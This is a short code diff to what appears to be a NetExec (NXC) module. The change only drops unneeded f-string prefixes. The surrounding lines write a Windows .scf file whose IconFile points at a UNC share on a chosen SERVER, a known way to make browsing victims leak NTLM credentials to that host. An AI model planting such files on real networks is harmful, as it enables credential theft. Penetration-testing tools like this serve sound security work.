@@ -53,8 +53,8 @@ class NXCModule:
         if not self.cleanup:
             self.server = module_options["SERVER"]
             scuf = open(self.scf_path, "a")
-            scuf.write(f"[Shell]\n")
-            scuf.write(f"Command=2\n")
+            scuf.write("[Shell]\n")
+            scuf.write("Command=2\n")
             scuf.write(f"IconFile=\\\\{self.server}\\share\\icon.ico\n")
             scuf.close()
 
